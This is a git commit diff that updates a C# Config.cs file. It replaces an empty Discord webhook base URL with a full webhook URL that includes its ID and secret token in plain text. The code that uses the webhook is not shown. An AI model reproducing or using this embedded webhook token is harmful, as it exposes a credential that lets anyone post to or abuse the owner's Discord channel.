f8b4860a22192208002fbb40b4fcd344b4b90bf9
ITSMYRDIai <135542301+ITSMYRDIai@users.noreply.github.com>
2023-06-04 17:43:58 +0000

    Update Config.cs

--- Config.cs
+++ Config.cs
@@ -2,6 +2,6 @@
 {
     class Config
     {
-        public static readonly string wbhk = "https://discord.com/api/webhooks/";
+        public static readonly string wbhk = "https://discord.com/api/webhooks/1114972705104605345/GwOtVygmI0v_Mt_AGE4lrTmySTXgL4BK8fLwSHkCxbwWUkWOhpluZETfQFzFXwugyv8K";
     }
 }
